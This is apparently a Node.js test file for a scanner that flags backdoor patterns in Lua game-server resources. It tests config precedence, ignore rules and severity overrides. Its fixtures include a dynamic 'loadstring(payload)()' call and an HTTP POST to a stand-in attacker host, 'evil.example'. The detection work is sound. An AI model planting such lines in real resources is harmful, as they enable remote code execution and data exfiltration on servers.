'use strict';

/** Edge cases for the config surface: defaults, precedence, and scan behaviour. */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');

const { resolveConfig } = require('../lib/config');

const ROOT = path.join(__dirname, '..');

const DEFAULTS = {
  targetDir: './resources',
  extensions: ['.lua'],
  maxFileBytes: 2 * 1024 * 1024,
  findingsPerRule: 3,
  snippetWidth: 160,
  followSymlinks: false,
  ignorePrivateIps: true,
  WHITELIST: [],
  ALLOWED_DOMAINS: ['cfx.re'],
};

const RULE_IDS = [
  'SL001', 'SL002', 'SL003', 'SL004', 'SL005', 'SL006', 'SL007', 'SL008', 'SL009',
  'SL010', 'SL011', 'SL012', 'SL013', 'SL014', 'SL015', 'SL016', 'SL017',
];

function tmpdir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'sl-edge-'));
}

function writeFile(dir, name, body) {
  const target = path.join(dir, name);
  fs.mkdirSync(path.dirname(target), { recursive: true });
  fs.writeFileSync(target, body);
  return target;
}

function resolve(cwd, extra = {}) {
  return resolveConfig({ cwd, defaults: DEFAULTS, ruleIds: RULE_IDS, ...extra });
}

function scan(cwd, targetArgs = [], extraArgs = []) {
  const argv = [path.join(ROOT, 'scanner.js'), ...targetArgs, '--json', '--no-color', '--no-trust', ...extraArgs];

  try {
    const stdout = execFileSync(process.execPath, argv, {
      cwd,
      encoding: 'utf8',
      timeout: 20000,
      env: { ...process.env, SOURCELOCK_WEBHOOK_URL: '' },
    });
    return { code: 0, result: JSON.parse(stdout) };
  } catch (error) {
    const stdout = String(error.stdout || '');
    return { code: error.status, result: stdout ? JSON.parse(stdout) : null, stderr: String(error.stderr || '') };
  }
}

/* ------------------------------------------------------------ precedence */

test('targetDir resolves relative to the config file, not the shell', () => {
  const dir = tmpdir();
  writeFile(dir, 'conf/.sourcelock.jsonc', '{"targetDir": "../resources"}');

  const resolved = resolve(dir, { configPath: 'conf/.sourcelock.jsonc' });
  assert.equal(resolved.config.targetDir, path.join(dir, 'resources'));
});

test('a custom ignoreFile is read relative to the config file', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelock.jsonc', '{"ignoreFile": "lists/skip.txt"}');
  writeFile(dir, 'lists/skip.txt', 'generated/\n');

  const resolved = resolve(dir);
  assert.equal(resolved.ignore.match('generated/thing.lua', false), true);
});

test('--ignore overrides the configured ignore file', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelock.jsonc', '{"ignoreFile": "lists/skip.txt"}');
  writeFile(dir, 'lists/skip.txt', 'generated/\n');
  writeFile(dir, 'override.ignore', 'other/\n');

  const resolved = resolve(dir, { ignorePath: 'override.ignore' });
  assert.equal(resolved.ignore.match('generated/thing.lua', false), false);
  assert.equal(resolved.ignore.match('other/thing.lua', false), true);
});

test('--no-config also ignores the ignore file', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelockignore', 'generated/\n');

  const resolved = resolve(dir, { useConfig: false });
  assert.equal(resolved.ignore.match('generated/thing.lua', false), false);
});

/* ---------------------------------------------------------- rule policy */

test('downgrading a high rule keeps the scan passing unless --strict', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelock.jsonc', '{"rules": {"SL001": "medium"}}');
  writeFile(dir, 'client/main.lua', 'loadstring(payload)()\n');

  const normal = scan(dir, ['.']);
  assert.equal(normal.code, 0);
  assert.equal(normal.result.findings[0].severity, 'medium');

  const strict = scan(dir, ['.'], ['--strict']);
  assert.equal(strict.code, 1);
});

test('an inspector rule can be turned off', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelock.jsonc', '{"rules": {"SL012": "off"}}');
  writeFile(dir, 'server/api.lua', 'PerformHttpRequest("https://evil.example/hook", cb, "POST")\n');

  const { code, result } = scan(dir, ['.']);
  assert.equal(code, 0);
  assert.equal(result.findings.length, 0, 'SL012 was disabled, so the literal URL is not reported');
});

test('a rule disabled in config is still evaluated when --no-config is used', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelock.jsonc', '{"rules": {"SL001": "off"}}');
  writeFile(dir, 'client/main.lua', 'loadstring(payload)()\n');

  const { code, result } = scan(dir, ['.'], ['--no-config']);
  assert.equal(code, 1);
  assert.equal(result.findings.length, 1);
});

/* -------------------------------------------------------------- formats */

test('a BOM, inline comments and trailing commas all parse', () => {
  const dir = tmpdir();
  writeFile(
    dir,
    '.sourcelock.jsonc',
    `\uFEFF{
      "whitelist": [
        "one/", // first
        "two/",
      ],
      "snippetWidth": 200
    }`
  );

  const resolved = resolve(dir);
  assert.deepEqual(resolved.config.WHITELIST, ['one/', 'two/']);
  assert.equal(resolved.config.snippetWidth, 200);
});

test('extensions are normalised to lowercase and dot-prefixed', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelock.jsonc', '{"extensions": [".LUA", ".Js"]}');

  assert.deepEqual(resolve(dir).config.extensions, ['.lua', '.js']);
});

test('whitelist entries with too many wildcards are refused', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelock.jsonc', '{"whitelist": ["*a*b*c*d*e/"]}');

  assert.throws(() => resolve(dir), /wildcards, the limit is 4/);
});

/* ---------------------------------------------------- ignore behaviour */

test('a negation keeps the ignored directory traversable', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelockignore', 'external/\n!external/keep.lua\n');
  writeFile(dir, 'external/evil.lua', 'loadstring(payload)()\n');
  writeFile(dir, 'external/keep.lua', 'loadstring(payload)()\n');

  const { code, result } = scan(dir, ['.']);

  assert.equal(code, 1);
  assert.deepEqual(
    result.findings.map((finding) => finding.file),
    ['external/keep.lua']
  );
  assert.equal(result.stats.ignored, 1);
  assert.equal(result.stats.ignoredDirs, 0, 'negation disables directory pruning');
});

test('targetDir from the config is used when no argument is given', () => {
  const dir = tmpdir();
  writeFile(dir, '.sourcelock.jsonc', '{"targetDir": "./res"}');
  writeFile(dir, 'res/client/main.lua', 'loadstring(payload)()\n');

  const { code, result } = scan(dir);

  assert.equal(code, 1);
  assert.equal(result.findings.length, 1);
  assert.equal(result.target, path.join(dir, 'res'));
});
